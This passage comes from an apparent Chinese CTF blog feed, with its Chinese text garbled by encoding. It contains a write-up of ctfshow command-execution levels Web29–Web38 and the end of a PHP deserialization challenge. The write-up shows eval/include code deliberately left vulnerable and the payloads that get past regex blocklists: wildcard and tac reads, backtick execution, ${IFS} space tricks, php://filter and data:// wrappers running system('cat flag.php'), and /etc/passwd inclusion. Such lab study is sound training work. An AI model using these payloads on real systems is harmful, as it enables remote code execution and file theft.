class="variable">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="variable">$f</span> = <span class="keyword">new</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">checkevil</span>()===<span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line">        <span class="title function_ invoke__">copy</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>],<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>()).<span class="string">&#x27;.txt&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>].<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;fn&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;work done&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;where is flag?&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">where is flag?</span><br></pre></td></tr></table></figure><p>â€‹æƒ³åŠæ³•è§¦å‘ <code>__destruct</code>  å³å¯ï¼Œè¿™é‡Œéœ€è¦ filename æˆ–è€… filecontent åŒ…å« php æˆ–è€… flagï¼Œè¿™æ ·åœ¨æœ€åé”€æ¯çš„æ—¶å€™ä¼šè¿›å…¥ system å‡½æ•°ï¼Œå¹¶ä¸” checkevil () ä¸º trueï¼Œä¸ä¼šè¿›å…¥ if è¯­å¥ï¼Œç¨‹åºä¼šè¿›å…¥æœ€åçš„é”€æ¯é˜¶æ®µï¼Œè§¦å‘ <code>__destruct</code> ï¼Œå› æ­¤ï¼Œå³å¯è¿›å…¥ system å‡½æ•°ï¼Œæ‰€ä»¥ payload ä¸ºï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fn=php;tac f*</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¸€äº›åŸºç¡€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#ä¸€äº›åŸºç¡€&quot;&gt;#&lt;/a&gt; ä¸€äº›åŸºç¡€ï¼š&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;private å˜é‡ä¼šè¢«åºåˆ—åŒ–ä¸ºï¼š&#92;x00 ç±»å &#92;x00 å˜é‡å&lt;br&gt;
 protected å˜é‡</summary>
      
    
    
    
    <category term="Webç‹—çš„è‡ªæˆ‘å®‰æ…°" scheme="http://blog.g01den.top/categories/Web/"/>
    
    
    <category term="Web" scheme="http://blog.g01den.top/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-å‘½ä»¤æ‰§è¡Œ</title>
    <link href="http://blog.g01den.top/posts/53e2b2e1.html"/>
    <id>http://blog.g01den.top/posts/53e2b2e1.html</id>
    <published>2024-09-16T13:04:45.000Z</published>
    <updated>2024-09-17T06:11:14.990Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web29"><a class="markdownIt-Anchor" href="#web29">#</a> Web29ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº†æ–‡ä»¶å…³é”®è¯ï¼Œé€šé…ç¬¦ç»•è¿‡ï¼Œcat f*ï¼Œç”¨ system æ‰§è¡Œï¼Œå‘ç°æ²¡æœ‰æˆåŠŸè¯»å–ï¼Œè€ƒè™‘ä½¿ç”¨ tac å€’åºè¯»å–ï¼Œå¾—åˆ° flagã€‚</p><p>â€‹<strong>æ€»ç»“ï¼Œæ–‡ä»¶å…³é”®è¯è¿‡æ»¤å¯ä»¥è€ƒè™‘ä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ã€‚</strong></p><h1 id="web30"><a class="markdownIt-Anchor" href="#web30">#</a> Web30ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† systemï¼Œå¹¶ä¸”ç”¨çš„å± eval å‡½æ•°ã€‚</p><p>â€‹è¿™é‡Œå…ˆè¯•è¯•åæ–œæ ç»•è¿‡ï¼Œä¼¼ä¹æ— æ³•ç»•è¿‡ã€‚</p><p>â€‹é‚£ä¹ˆå°±è¯•ç€åå¼•å·ç»•è¿‡ï¼Œecho `ls`; ï¼ŒæˆåŠŸç»•è¿‡ï¼Œä¹‹åç›´æ¥ echo `tac fl*`; è¯»å– flagã€‚</p><h1 id="web31"><a class="markdownIt-Anchor" href="#web31">#</a> Web31ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå‘ç°ç©ºæ ¼ï¼Œå•å¼•å·è¢«è¿‡æ»¤äº†ï¼Œè¿˜æœ‰å°æ•°ç‚¹ï¼Œæ²¡æœ‰è¿‡æ»¤åå¼•å·ï¼Œç›´æ¥åå¼•å·ç»•è¿‡ï¼ŒæˆåŠŸç»•è¿‡ systemï¼Œcat è¢«è¿‡æ»¤å°± tac è¯»å–ï¼Œç©ºæ ¼ç”¨ %0a æˆ–è€… %09 ç»•è¿‡ã€‚</p><p>â€‹å‰ç½®çŸ¥è¯†ï¼š</p><p><strong>ç©ºæ ¼è¿‡æ»¤ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%09 ç¬¦å·éœ€è¦phpç¯å¢ƒ</span></span><br><span class="line">&#123;cat,flag.txt&#125; </span><br><span class="line">cat<span class="built_in">$</span>&#123;IFS&#125;flag.txt</span><br><span class="line">cat<span class="built_in">$</span>IFS<span class="built_in">$</span>9flag.txt</span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">kg=<span class="built_in">$</span>&#x27;<span class="keyword">\x</span>20flag.txt&#x27;<span class="built_in">&amp;</span><span class="built_in">&amp;</span>cat<span class="built_in">$</span>kg</span><br><span class="line">(<span class="keyword">\x</span>20è½¬æ¢æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ï¼Œè¿™é‡Œé€šè¿‡å˜é‡çš„æ–¹å¼å·§å¦™ç»•è¿‡)</span><br></pre></td></tr></table></figure><p><strong>cat è¿‡æ»¤ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">more:ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹</span><br><span class="line">less:ä¸ more ç±»ä¼¼ã€‚ä½†åœ¨ç”¨ more æ—¶å€™å¯èƒ½ä¸èƒ½å‘ä¸Šç¿»é¡µï¼Œä¸èƒ½å‘ä¸Šæœç´¢æŒ‡å®šå­—ç¬¦ä¸²ï¼Œè€Œ less å´å¯ä»¥è‡ªç”±çš„å‘ä¸Šå‘ä¸‹ç¿»é¡µï¼Œä¹Ÿå¯ä»¥è‡ªç”±çš„å‘ä¸Šå‘ä¸‹æœç´¢æŒ‡å®šå­—ç¬¦ä¸²ã€‚</span><br><span class="line">head:æŸ¥çœ‹å¤´å‡ è¡Œ</span><br><span class="line">tac:ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤º</span><br><span class="line">tail:æŸ¥çœ‹å°¾å‡ è¡Œ</span><br><span class="line">nlï¼šå‘½ä»¤çš„ä½œç”¨å’Œ cat -n ç±»ä¼¼ï¼Œæ˜¯å°†æ–‡ä»¶å†…å®¹å…¨éƒ¨æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œå¹¶ä¸”æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼ŒåŒæ—¶ä¼šè‡ªåŠ¨æ‰“å°å‡ºè¡Œå·ã€‚</span><br><span class="line">od:ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹</span><br><span class="line">vi:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">vim:ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹</span><br><span class="line">sort:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">uniq:å¯ä»¥æŸ¥çœ‹</span><br><span class="line">file -f:æŠ¥é”™å‡ºå…·ä½“å†…å®¹ã€‚å¯ä»¥åˆ©ç”¨æŠ¥é”™å°†æ–‡ä»¶å†…å®¹å¸¦å‡ºæ¥ï¼ˆ-f&lt;åç§°æ–‡ä»¶&gt; ã€€æŒ‡å®šåç§°æ–‡ä»¶ï¼Œå…¶å†…å®¹æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶åç§°æ—¶ï¼Œè®©fileä¾åºè¾¨è¯†è¿™äº›æ–‡ä»¶ï¼Œæ ¼å¼ä¸ºæ¯åˆ—ä¸€ä¸ªæ–‡ä»¶åç§°ã€‚ï¼‰</span><br></pre></td></tr></table></figure><h1 id="web32"><a class="markdownIt-Anchor" href="#web32">#</a> Web32ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿‡æ»¤äº† system å’Œåå¼•å·è¿˜æœ‰ echoï¼Œè¿™é‡Œçœ‹ä¼¼æŒºä¸¥æ ¼çš„ï¼Œä½†æ˜¯ print_r æˆ–è€… var_dump æ²¡æœ‰è¿‡æ»¤ï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨ä¸‹ï¼Œä½†æ˜¯ï¼Œsystem è¢«è¿‡æ»¤äº†ï¼Œåªæœ‰æ— å›æ˜¾ RCE äº†ï¼Œä½†æ˜¯ï¼Œè¿‡æ»¤äº†å·¦åŠè¾¹æ‹¬å·ï¼Œè¿™æ ·å°±æ²¡æ³•ç»•äº†ï¼Œè¯•ä¸€è¯•ä¸éœ€è¦æ‹¬å·çš„è¯­å¥ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">die</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;etc/passwd&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>â€‹<strong>å¯ä»¥é…åˆæ–‡ä»¶åŒ…å«æ¥æ‰“ä¼ªåè®®ï¼Œå…·ä½“ payload ç±»ä¼¼ä¸‹é¢è¿™æ ·ï¼š</strong></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include&quot;<span class="built_in">$</span><span class="built_in">_</span>GET[url]&quot;?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web33"><a class="markdownIt-Anchor" href="#web33">#</a> Web33ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº†åˆ†å·å’ŒåŒå¼•å·ï¼Œåå¼•å·å’Œç©ºæ ¼ç­‰ç­‰ä¾ç„¶è¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™ä¼¼ä¹æ›´éš¾åŠäº†ï¼Œè¿˜æ˜¯æ‰“æ–‡ä»¶åŒ…å«åŠ ä¼ªåè®®æ¥æ‰“ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web34"><a class="markdownIt-Anchor" href="#web34">#</a> Web34ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å¤šè¿‡æ»¤äº†ä¸€ä¸ªå†’å·ï¼Œæ–¹æ³•åŒä¸Šï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè§£é‡Šä¸€ä¸‹ï¼Œè¿™é‡Œå‡ºç°å†’å·ä¾æ—§ç»•è¿‡äº†çš„åŸå› æ˜¯å› ä¸º PHP æŠŠå‰é¢çš„ include åˆ°ï¼Ÿ&gt; çš„è®¤ä¸ºæˆä¸€ä¸ª get ä¼ å‚ï¼Œå¦ä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯ &amp; url è¢«è®¤ä¸ºæ˜¯å¦ä¸€ä¸ªä¼ å‚ï¼Œæ­£åˆ™åªæ£€æµ‹ç¬¬ä¸€ä¸ªéƒ¨åˆ†ï¼Œç¬¬äºŒä¸ªéƒ¨åˆ†å°±ä¸ä¼šæ£€æµ‹äº†ã€‚</p><h1 id="web35"><a class="markdownIt-Anchor" href="#web35">#</a> Web35ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹å°äºç¬¦å·ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œä¸è¿‡æ— ä¼¤å¤§é›…ï¼Œä¾æ—§è€æ ·å­ï¼Œå› ä¸ºæ²¡æœ‰è¿‡æ»¤ &gt;ï¼Œæ‰€ä»¥ä¾æ—§èƒ½ç”¨ä¸Šé¢çš„ payload æ‰“ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web36"><a class="markdownIt-Anchor" href="#web36">#</a> Web36ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œè¿å¸¦ç€æ•°å­—ä¸€èµ·è¿‡æ»¤äº†ï¼Œæ— ä¼¤å¤§é›…ï¼Œç»§ç»­æ–‡ä»¶åŒ…å«ä¸€æŠŠæ¢­ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include<span class="built_in">$</span><span class="built_in">_</span>GET[url]?&gt;<span class="built_in">&amp;</span>url=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h1 id="web37"><a class="markdownIt-Anchor" href="#web37">#</a> Web37ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>â€‹æ–‡ä»¶åŒ…å«è¿‡æ»¤äº† flagï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥è€ƒè™‘ include ä¸€ä¸ª data ä¼ªåè®®è¾“å…¥çš„å‘½ä»¤å‚æ•°ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><blockquote><p>data://ï¼Œå¯ä»¥è®©ç”¨æˆ·æ¥æ§åˆ¶è¾“å…¥æµï¼Œå½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œç”¨æˆ·è¾“å…¥çš„ data:// æµä¼šè¢«å½“ä½œ php æ–‡ä»¶æ‰§è¡Œ</p></blockquote><p>â€‹<strong>ç¬¬ä¸€ï¼šä½¿ç”¨é€šé…ç¬¦ç»•è¿‡ flagï¼š</strong></p><blockquote><p>?c=data://text/plain,<?php echo system('cat fl*');?><br>?c=data://text/plain,<?php%20 system('cat fl*');?></p></blockquote><p>â€‹<strong>ç¬¬äºŒï¼šä½¿ç”¨ base64 ç»•è¿‡ flagï¼š</strong></p><blockquote><p>?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p><p>#base64 è§£ç ä¸º <code>&lt;?php system('cat flag.php');?&gt;</code></p></blockquote><h1 id="web38"><a class="markdownIt-Anchor" href="#web38">#</a> Web38ï¼š</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span 